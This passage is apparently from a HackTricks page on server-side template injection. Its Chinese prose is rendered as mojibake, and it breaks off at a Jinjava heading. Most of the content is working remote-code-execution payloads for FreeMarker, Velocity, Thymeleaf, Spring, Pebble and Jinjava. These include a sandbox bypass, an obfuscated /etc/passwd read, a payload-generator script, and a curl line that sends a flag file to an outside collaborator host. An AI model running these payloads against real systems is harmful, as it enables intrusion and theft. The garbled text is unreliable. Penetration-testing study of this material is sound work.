# SSTIï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹èšä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

## ä»€ä¹ˆæ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ

å½“æ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨æœ¬æœºæ¨¡æ¿è¯­æ³•å°†æ¶æ„æœ‰æ•ˆè´Ÿè½½æ³¨å…¥åˆ°æ¨¡æ¿ä¸­ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œæ—¶ï¼Œå°±ä¼šå‘ç”ŸæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚

**æ¨¡æ¿å¼•æ“**æ—¨åœ¨é€šè¿‡**å°†å›ºå®š**æ¨¡æ¿ä¸**æ˜“å˜**æ•°æ®**ç»“åˆ**æ¥ç”Ÿæˆç½‘é¡µã€‚å½“**ç”¨æˆ·è¾“å…¥**ç›´æ¥**è¿æ¥åˆ°æ¨¡æ¿**è€Œä¸æ˜¯ä½œä¸ºæ•°æ®ä¼ é€’æ—¶ï¼Œå°±å¯èƒ½å‘ç”ŸæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿ**æ³¨å…¥ä»»æ„æ¨¡æ¿æŒ‡ä»¤**ä»¥æ“çºµæ¨¡æ¿å¼•æ“ï¼Œé€šå¸¸ä½¿ä»–ä»¬èƒ½å¤Ÿå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚

ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š
```php
$output = $twig->render("Dear " . $_GET['name']);
```
åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œ**æ¨¡æ¿çš„ä¸€éƒ¨åˆ†**æ˜¯ä½¿ç”¨`GET`å‚æ•°`name`**åŠ¨æ€ç”Ÿæˆ**çš„ã€‚ç”±äºæ¨¡æ¿è¯­æ³•åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œè¯„ä¼°ï¼Œè¿™å¯èƒ½å…è®¸æ”»å‡»è€…å°†æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æœ‰æ•ˆè´Ÿè½½æ”¾å…¥`name`å‚æ•°ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## æ„å»ºæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### æ£€æµ‹

ä¸ä»»ä½•æ¼æ´ä¸€æ ·ï¼Œåˆ©ç”¨æ¼æ´çš„ç¬¬ä¸€æ­¥æ˜¯èƒ½å¤Ÿæ‰¾åˆ°å®ƒã€‚ä¹Ÿè®¸æœ€ç®€å•çš„åˆå§‹æ–¹æ³•æ˜¯å°è¯•é€šè¿‡æ³¨å…¥ä¸€ç³»åˆ—å¸¸ç”¨äºæ¨¡æ¿è¡¨è¾¾å¼çš„ç‰¹æ®Šå­—ç¬¦æ¥**æ¨¡ç³ŠåŒ–æ¨¡æ¿**ï¼Œä¾‹å¦‚å¤šè¯­è¨€**`${{<%[%'"}}%\`**ã€‚\
ä¸ºäº†æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œæ‚¨åº”è¯¥**æ³¨æ„å‚æ•°ä¸Šçš„** **å¸¸è§„æ•°æ®** å’Œ**ç»™å®šè´Ÿè½½**ä¹‹é—´çš„**å·®å¼‚**ã€‚\
å¦‚æœ**å‘ç”Ÿé”™è¯¯**ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“å°±èƒ½å‘ç°**æœåŠ¡å™¨å­˜åœ¨æ¼æ´**ï¼Œç”šè‡³å¯ä»¥çŸ¥é“æ­£åœ¨è¿è¡Œçš„**å¼•æ“**ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨æœŸæœ›å®ƒ**åæ˜ **ç»™å®šçš„è´Ÿè½½ï¼Œè€Œå®ƒ**æ²¡æœ‰è¢«åæ˜ **ï¼Œæˆ–è€…å“åº”ä¸­æœ‰ä¸€äº›**ç¼ºå¤±å­—ç¬¦**ï¼Œä¹Ÿå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ã€‚

**æ£€æµ‹ - æ˜æ–‡ä¸Šä¸‹æ–‡**

ç»™å®šçš„è¾“å…¥è¢«**å‘ˆç°å’Œåæ˜ **åˆ°å“åº”ä¸­ã€‚è¿™å¾ˆå®¹æ˜“è¢«è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªç®€å•çš„[**XSS**](../xss-cross-site-scripting/)æ¼æ´ï¼Œä½†å¦‚æœå°è¯•åœ¨æ¨¡æ¿è¡¨è¾¾å¼ä¸­è®¾ç½®**æ•°å­¦è¿ç®—**ï¼Œå°±å¾ˆå®¹æ˜“åŒºåˆ†å‡ºæ¥ï¼š
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**æ£€æµ‹ - ä»£ç ä¸Šä¸‹æ–‡**

åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œ**ç”¨æˆ·è¾“å…¥**è¢«æ”¾ç½®åœ¨ä¸€ä¸ª**æ¨¡æ¿è¡¨è¾¾å¼**ä¸­ï¼š
```python
engine.render("Hello {{"+greeting+"}}", data)
```
è®¿é—®è¯¥é¡µé¢çš„URLå¯èƒ½ç±»ä¼¼äºï¼š`http://vulnerable-website.com/?greeting=data.username`

å¦‚æœ**æ›´æ”¹**`greeting`å‚æ•°ä¸º**ä¸åŒçš„å€¼**ï¼Œ**å“åº”å°†ä¸åŒ…å«ç”¨æˆ·å**ï¼Œä½†å¦‚æœè®¿é—®ç±»ä¼¼äºï¼š`http://vulnerable-website.com/?greeting=data.username}}hello`ï¼Œé‚£ä¹ˆ**å“åº”å°†åŒ…å«ç”¨æˆ·å**ï¼ˆå¦‚æœç»“æŸæ¨¡æ¿è¡¨è¾¾å¼å­—ç¬¦ä¸º**`}}`**ï¼‰ã€‚\
å¦‚æœåœ¨è¿™äº›æµ‹è¯•è¿‡ç¨‹ä¸­**å‡ºç°é”™è¯¯**ï¼Œå°†æ›´å®¹æ˜“å‘ç°æœåŠ¡å™¨å­˜åœ¨æ¼æ´ã€‚

### è¯†åˆ«

ä¸€æ—¦æ£€æµ‹åˆ°æ¨¡æ¿æ³¨å…¥æ½œåŠ›ï¼Œä¸‹ä¸€æ­¥æ˜¯è¯†åˆ«æ¨¡æ¿å¼•æ“ã€‚\
å°½ç®¡æœ‰å¤§é‡çš„æ¨¡æ¿è¯­è¨€ï¼Œä½†è®¸å¤šæ¨¡æ¿è¯­è¨€ä½¿ç”¨éå¸¸ç›¸ä¼¼çš„è¯­æ³•ï¼Œç‰¹æ„é€‰æ‹©ä¸ä¸HTMLå­—ç¬¦å†²çªã€‚

å¦‚æœå¹¸è¿çš„è¯ï¼ŒæœåŠ¡å™¨å°†**æ‰“å°é”™è¯¯**ï¼Œæ‚¨å°†èƒ½å¤Ÿåœ¨é”™è¯¯ä¸­æ‰¾åˆ°ä½¿ç”¨çš„**å¼•æ“**ã€‚ä¸€äº›å¯èƒ½å¯¼è‡´é”™è¯¯çš„æœ‰æ•ˆè½½è·ï¼š

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

å¦åˆ™ï¼Œæ‚¨å°†éœ€è¦æ‰‹åŠ¨**æµ‹è¯•ä¸åŒçš„ç‰¹å®šè¯­è¨€æœ‰æ•ˆè½½è·**ï¼Œå¹¶ç ”ç©¶æ¨¡æ¿å¼•æ“å¦‚ä½•è§£é‡Šå®ƒä»¬ã€‚ä¸€ä¸ªå¸¸è§çš„åšæ³•æ˜¯ä½¿ç”¨æ¥è‡ªä¸åŒæ¨¡æ¿å¼•æ“çš„è¯­æ³•æ³¨å…¥ä»»æ„æ•°å­¦è¿ç®—ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥è§‚å¯Ÿå®ƒä»¬æ˜¯å¦è¢«æˆåŠŸè¯„ä¼°ã€‚ä¸ºäº†å¸®åŠ©è¿™ä¸ªè¿‡ç¨‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„å†³ç­–æ ‘ï¼š

![](<../../.gitbook/assets/image (272).png>)

### åˆ©ç”¨

**é˜…è¯»**

åœ¨æ‰¾åˆ°æ¨¡æ¿æ³¨å…¥å¹¶è¯†åˆ«æ¨¡æ¿å¼•æ“åçš„ç¬¬ä¸€æ­¥æ˜¯é˜…è¯»æ–‡æ¡£ã€‚æ„Ÿå…´è¶£çš„å…³é”®é¢†åŸŸåŒ…æ‹¬ï¼š

* æ¶µç›–åŸºæœ¬è¯­æ³•çš„â€œå¯¹äºæ¨¡æ¿ä½œè€…â€éƒ¨åˆ†ã€‚
* â€œå®‰å…¨æ³¨æ„äº‹é¡¹â€ - å¾ˆå¯èƒ½æ‚¨æ­£åœ¨æµ‹è¯•çš„åº”ç”¨ç¨‹åºçš„å¼€å‘äººå‘˜æ²¡æœ‰é˜…è¯»è¿™éƒ¨åˆ†ï¼Œå®ƒå¯èƒ½åŒ…å«ä¸€äº›æœ‰ç”¨çš„æç¤ºã€‚
* å†…ç½®æ–¹æ³•ã€å‡½æ•°ã€è¿‡æ»¤å™¨å’Œå˜é‡çš„åˆ—è¡¨ã€‚
* æ‰©å±•/æ’ä»¶åˆ—è¡¨ - ä¸€äº›å¯èƒ½é»˜è®¤å¯ç”¨ã€‚

**æ¢ç´¢**

å‡è®¾æ²¡æœ‰å‘ç°æ¼æ´ï¼Œä¸‹ä¸€æ­¥æ˜¯**æ¢ç´¢ç¯å¢ƒ**ï¼Œä»¥æ‰¾å‡º**æ‚¨å¯ä»¥è®¿é—®çš„å†…å®¹**ã€‚æ‚¨å¯ä»¥æœŸæœ›æ‰¾åˆ°æ¨¡æ¿å¼•æ“æä¾›çš„**é»˜è®¤å¯¹è±¡**å’Œå¼€å‘äººå‘˜é€šè¿‡æ¨¡æ¿ä¼ é€’ç»™æ¨¡æ¿çš„**ç‰¹å®šäºåº”ç”¨ç¨‹åºçš„å¯¹è±¡**ã€‚è®¸å¤šæ¨¡æ¿ç³»ç»Ÿå…¬å¼€ä¸€ä¸ªåŒ…å«ä½œç”¨åŸŸå†…æ‰€æœ‰å†…å®¹çš„â€œselfâ€æˆ–å‘½åç©ºé—´å¯¹è±¡ï¼Œå¹¶åˆ—å‡ºå¯¹è±¡å±æ€§å’Œæ–¹æ³•çš„æƒ¯ç”¨æ–¹å¼ã€‚

å¦‚æœæ²¡æœ‰å†…ç½®çš„selfå¯¹è±¡ï¼Œæ‚¨å°†éœ€è¦ä½¿ç”¨[SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)å’ŒBurp Intruderçš„å•è¯åˆ—è¡¨é›†åˆæ¥æš´åŠ›ç ´è§£å˜é‡åã€‚

å¼€å‘äººå‘˜æä¾›çš„å¯¹è±¡ç‰¹åˆ«å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¹¶ä¸”å¯èƒ½åœ¨åº”ç”¨ç¨‹åºä¸­çš„ä¸åŒæ¨¡æ¿ä¹‹é—´æœ‰æ‰€ä¸åŒï¼Œå› æ­¤æœ€å¥½å°†æ­¤è¿‡ç¨‹åº”ç”¨äºæ¯ä¸ªå•ç‹¬çš„æ¨¡æ¿ã€‚

**æ”»å‡»**

æ­¤æ—¶ï¼Œæ‚¨åº”è¯¥å¯¹å¯ç”¨çš„æ”»å‡»é¢æœ‰ä¸€ä¸ª**æ˜ç¡®çš„æ¦‚å¿µ**ï¼Œå¹¶èƒ½å¤Ÿç»§ç»­ä½¿ç”¨ä¼ ç»Ÿçš„å®‰å…¨å®¡è®¡æŠ€æœ¯ï¼Œå®¡æŸ¥æ¯ä¸ªå‡½æ•°ä»¥æŸ¥æ‰¾å¯åˆ©ç”¨çš„æ¼æ´ã€‚é‡è¦çš„æ˜¯è¦å°†è¿™ä¸€è¿‡ç¨‹æ”¾åœ¨æ›´å¹¿æ³›åº”ç”¨çš„èƒŒæ™¯ä¸‹è¿›è¡Œ - ä¸€äº›å‡½æ•°å¯ä»¥ç”¨äºåˆ©ç”¨ç‰¹å®šäºåº”ç”¨ç¨‹åºçš„åŠŸèƒ½ã€‚æ¥ä¸‹æ¥çš„ç¤ºä¾‹å°†ä½¿ç”¨æ¨¡æ¿æ³¨å…¥æ¥è§¦å‘ä»»æ„å¯¹è±¡åˆ›å»ºã€ä»»æ„æ–‡ä»¶è¯»å–/å†™å…¥ã€è¿œç¨‹æ–‡ä»¶åŒ…å«ã€ä¿¡æ¯æ³„éœ²å’Œæƒé™æå‡æ¼æ´ã€‚

## å·¥å…·

### [TInjA](https://github.com/Hackmanit/TInjA)

ä¸€æ¬¾é«˜æ•ˆçš„SSTI + CSTIæ‰«æå™¨ï¼Œåˆ©ç”¨æ–°é¢–çš„å¤šè¯­è¨€æ··æ·†æŠ€æœ¯ã€‚
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [æ¨¡æ¿æ³¨å…¥è¡¨](https://github.com/Hackmanit/template-injection-table)

ä¸€ä¸ªäº¤äº’å¼è¡¨æ ¼ï¼ŒåŒ…å«æœ€æœ‰æ•ˆçš„æ¨¡æ¿æ³¨å…¥å¤šè¯­è¨€ä»¥åŠ44ä¸ªæœ€é‡è¦çš„æ¨¡æ¿å¼•æ“çš„é¢„æœŸå“åº”ã€‚

## æ”»å‡»

### é€šç”¨

åœ¨è¿™ä¸ª**å•è¯åˆ—è¡¨**ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸‹é¢æåˆ°çš„ä¸€äº›å¼•æ“ç¯å¢ƒä¸­å®šä¹‰çš„**å˜é‡**ï¼š

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - åŸºæœ¬æ³¨å…¥**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - è·å–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡**
```java
${T(java.lang.System).getenv()}
```
**Java - è·å– /etc/passwd**
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

æ‚¨å¯ä»¥åœ¨ [https://try.freemarker.apache.org](https://try.freemarker.apache.org) å°è¯•æ‚¨çš„æœ‰æ•ˆè½½è·

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - æ²™ç›’ç»•è¿‡**

âš ï¸ ä»…é€‚ç”¨äºç‰ˆæœ¬ä½äº2.3.30çš„Freemarkerã€‚
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**æ›´å¤šä¿¡æ¯**

* è¯·æŸ¥çœ‹[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ä¸­çš„FreeMarkeréƒ¨åˆ†ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**æ›´å¤šä¿¡æ¯**

* åœ¨Velocityéƒ¨åˆ†[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

SSTIçš„å…¸å‹æµ‹è¯•è¡¨è¾¾å¼æ˜¯`${7*7}`ã€‚è¿™ä¸ªè¡¨è¾¾å¼åœ¨Thymeleafä¸­ä¹Ÿé€‚ç”¨ã€‚å¦‚æœè¦å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æµ‹è¯•è¡¨è¾¾å¼ä¹‹ä¸€ï¼š

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

ç„¶è€Œï¼Œæ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œè¡¨è¾¾å¼åªåœ¨ç‰¹æ®Šçš„Thymeleafå±æ€§ä¸­èµ·ä½œç”¨ã€‚å¦‚æœéœ€è¦åœ¨æ¨¡æ¿çš„ä¸åŒä½ç½®ä½¿ç”¨è¡¨è¾¾å¼ï¼ŒThymeleafæ”¯æŒ_è¡¨è¾¾å¼å†…è”_ã€‚è¦ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œå¿…é¡»å°†è¡¨è¾¾å¼æ”¾åœ¨`[[...]]`æˆ–`[(...)]`ä¸­ï¼ˆæ ¹æ®æ˜¯å¦éœ€è¦è½¬ä¹‰ç‰¹æ®Šç¬¦å·é€‰æ‹©å…¶ä¸­ä¹‹ä¸€ï¼‰ã€‚å› æ­¤ï¼ŒThymeleafçš„ç®€å•SSTIæ£€æµ‹æœ‰æ•ˆè´Ÿè½½å°†æ˜¯`[[${7*7}]]`ã€‚

ç„¶è€Œï¼Œä¸Šè¿°æ£€æµ‹æœ‰æ•ˆè´Ÿè½½èƒ½å¤Ÿèµ·ä½œç”¨çš„å¯èƒ½æ€§éå¸¸ä½ã€‚SSTIæ¼æ´é€šå¸¸å‘ç”Ÿåœ¨ä»£ç ä¸­åŠ¨æ€ç”Ÿæˆæ¨¡æ¿çš„æƒ…å†µä¸‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒThymeleafä¸å…è®¸è¿™æ ·çš„åŠ¨æ€ç”Ÿæˆæ¨¡æ¿ï¼Œæ‰€æœ‰æ¨¡æ¿å¿…é¡»æå‰åˆ›å»ºã€‚å› æ­¤ï¼Œå¦‚æœå¼€å‘äººå‘˜æƒ³è¦æ ¹æ®éœ€è¦åˆ›å»ºä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²ï¼Œä»–ä»¬éœ€è¦åˆ›å»ºè‡ªå·±çš„TemplateResolverã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œä½†å‘ç”Ÿçš„é¢‘ç‡éå¸¸ä½ã€‚

å¦‚æœæˆ‘ä»¬æ·±å…¥ç ”ç©¶Thymeleafæ¨¡æ¿å¼•æ“çš„æ–‡æ¡£ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªæœ‰è¶£çš„åŠŸèƒ½ï¼Œç§°ä¸º_**è¡¨è¾¾å¼é¢„å¤„ç†**_ã€‚æ”¾ç½®åœ¨åŒä¸‹åˆ’çº¿ä¹‹é—´çš„è¡¨è¾¾å¼ï¼ˆ`__...__`ï¼‰å°†è¢«é¢„å¤„ç†ï¼Œå¹¶é¢„å¤„ç†çš„ç»“æœå°†ä½œä¸ºå¸¸è§„å¤„ç†è¿‡ç¨‹ä¸­è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ã€‚ä»¥ä¸‹æ˜¯Thymeleafæ–‡æ¡£ä¸­çš„å®˜æ–¹ç¤ºä¾‹ï¼š
```java
#{selection.__${sel.code}__}
```
**æ˜“å—æ”»å‡»çš„ç¤ºä¾‹**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**æ›´å¤šä¿¡æ¯**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**ç»•è¿‡è¿‡æ»¤å™¨**

å¦‚æœ`${...}`æ— æ•ˆï¼Œå¯ä»¥å°è¯•ä½¿ç”¨å¤šä¸ªå˜é‡è¡¨è¾¾å¼ï¼Œå¦‚`#{...}`, `*{...}`, `@{...}`æˆ–`~{...}`ã€‚

* è¯»å–`/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* ç”¨äºç”Ÿæˆ payload çš„è‡ªå®šä¹‰è„šæœ¬
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**æ›´å¤šä¿¡æ¯**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Spring è§†å›¾æ“çºµï¼ˆJavaï¼‰
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Pebbleçš„æ—§ç‰ˆæœ¬ï¼ˆ<ç‰ˆæœ¬3.0.9ï¼‰:
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
æ–°ç‰ˆæœ¬çš„Pebbleï¼š
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}





{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjavaæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„Javaæ¨¡æ¿å¼•æ“ï¼Œå¯ä»¥ç”¨äºå¤„ç†æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼ŒSSTIï¼‰æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨SSTIæ¼æ´æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè®¿é—®æ•æ„Ÿæ•°æ®ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œéœ€è¦æ³¨æ„å¹¶ä¿®å¤è¿™ç±»æ¼æ´ï¼Œä»¥ç¡®ä¿ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
**Jinjava - å‘½ä»¤æ‰§è¡Œ**

